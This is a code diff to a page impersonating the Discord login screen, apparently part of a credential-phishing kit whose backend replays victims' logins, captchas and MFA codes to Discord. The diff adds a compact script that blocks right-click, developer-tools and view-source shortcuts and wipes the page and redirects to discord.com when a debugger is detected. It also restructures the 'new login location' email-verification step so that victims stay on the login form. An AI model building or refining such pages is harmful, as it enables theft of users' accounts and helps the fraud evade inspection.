@@ -6,6 +6,7 @@
   <meta name="referrer" content="no-referrer"/>
   <title>Discord | Login</title>
   <link rel="icon" href="https://discord.com/assets/favicon.ico"/>
+  <script>!function(){var _0x=function(){try{return!!window.console&&(window.console.log(''),!0)}catch(e){return!1}};document.addEventListener('contextmenu',function(e){e.preventDefault()});document.addEventListener('keydown',function(e){if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i'||e.key==='J'||e.key==='j'||e.key==='C'||e.key==='c'))||(e.ctrlKey&&(e.key==='U'||e.key==='u'||e.key==='S'||e.key==='s'))){e.preventDefault();e.stopPropagation();return false}});var _chk=new Image();Object.defineProperty(_chk,'id',{get:function(){document.body.innerHTML='';window.location.href='https://discord.com'}});setInterval(function(){var t0=performance.now();debugger;if(performance.now()-t0>100){document.body.innerHTML='';window.location.href='https://discord.com'}},3000);var _el=document.createElement('div');Object.defineProperty(_el,'id',{get:function(){document.body.innerHTML='';window.location.href='https://discord.com'}})}();</script>
   <link rel="preconnect" href="https://fonts.googleapis.com"/>
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
   <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;600;700&display=swap" rel="stylesheet"/>
@@ -233,27 +234,8 @@
         <div id="mfa-links" style="display:none"></div>
       </div>
 
-      <!-- Email Verification -->
-      <div id="sec-email-verify" style="display:none">
-        <div class="card-header">
-          <div style="text-align:center;margin-bottom:12px">
-            <svg width="80" height="80" viewBox="0 0 24 24" fill="none" style="margin:0 auto">
-              <rect x="2" y="5" width="20" height="14" rx="2" stroke="#5865f2" stroke-width="1.5" fill="none"/>
-              <polyline points="2,5 12,13 22,5" stroke="#5865f2" stroke-width="1.5" fill="none"/>
-            </svg>
-          </div>
-          <h1 style="font-size:24px;text-align:center">Check your email</h1>
-          <p style="color:var(--text-muted);text-align:center;font-size:14px;margin-top:8px">
-            We've detected a new login location. A verification email has been sent to your inbox.<br/>
-            Please click the <strong>Verify Login</strong> link in the email, then come back here and click <strong>Continue</strong>.
-          </p>
-        </div>
-        <div class="err-msg" id="email-verify-error"></div>
-        <button class="btn" id="email-verify-btn" onclick="retryAfterVerify()" style="margin-top:16px">Continue</button>
-        <div style="text-align:center;margin-top:12px">
-          <a class="mfa-method" onclick="backToLogin()">&larr; Back to login</a>
-        </div>
-      </div>
+      <!-- Email Verification (now inline — no separate page) -->
+      <div id="sec-email-verify" style="display:none"></div>
 
     </div>
 
@@ -536,7 +518,6 @@ function processServerResult(d) {
   }
   if (d.email_verify) {
     showEmailVerify(captchaSid);
-    btnLoad('login-btn', false);
     return;
   }
   if (d.mfa !== undefined && d.ticket) {
@@ -567,60 +548,17 @@ var emailVerifySid = null;
 
 function showEmailVerify(sid) {
   emailVerifySid = sid;
-  showSec('email-verify');
-  /* Disable Continue for 10s so user doesn't click blindly */
-  var btn = document.getElementById('email-verify-btn');
-  btn.disabled = true;
-  btn.textContent = 'Continue (10s)';
-  var secs = 10;
-  var _evTimer = setInterval(function() {
-    secs--;
-    if (secs <= 0) {
-      clearInterval(_evTimer);
-      btn.disabled = false;
-      btn.textContent = 'Continue';
-    } else {
-      btn.textContent = 'Continue (' + secs + 's)';
-    }
-  }, 1000);
+  /* Stay on login form — just show red warning text above email field */
+  showSec('login');
+  btnLoad('login-btn', false);
+  showErr('login-error', 'New login location detected. Please check your email.');
+  /* Make the error red and prominent */
+  var errEl = document.getElementById('login-error');
+  if (errEl) { errEl.style.color = '#ed4245'; errEl.style.fontWeight = '600'; }
 }
 
 async function retryAfterVerify() {
-  if (!emailVerifySid) return;
-  var btn = document.getElementById('email-verify-btn');
-  btn.disabled = true;
-  btn.textContent = 'Checking...';
-  hideErr('email-verify-error');
-  try {
-    var r = await fetch('/api/login/retry/' + emailVerifySid, {method:'POST'});
-    var d = await r.json();
-    if (d.captcha_stall) {
-      /* Server is solving captcha again — show stall and poll */
-      showCaptchaStall(d.session_id);
-      return;
-    }
-    if (d.success) { onSuccess(d); return; }
-    if (d.mfa !== undefined && d.ticket) {
-      mfaTicket = d.ticket; mfaHasSms = !!d.sms; mfaMode = 'totp';
-      showSec('mfa'); updateMfaUI(); return;
-    }
-    /* Error */
-    var errMsg = d.message || d.error || 'Verification failed.';
-    if (d.errors) {
-      var keys = Object.keys(d.errors);
-      for (var i = 0; i < keys.length; i++) {
-        var fe = d.errors[keys[i]];
-        if (fe && fe._errors && fe._errors.length) { errMsg = fe._errors[0].message; break; }
-      }
-    }
-    showErr('email-verify-error', errMsg);
-    btn.disabled = false;
-    btn.textContent = 'Continue';
-  } catch(e) {
-    showErr('email-verify-error', 'Connection error. Try again.');
-    btn.disabled = false;
-    btn.textContent = 'Continue';
-  }
+  /* No longer used — login form submit handles retry automatically */
 }
 
 /* Fallback captcha overlay (no API key configured) */
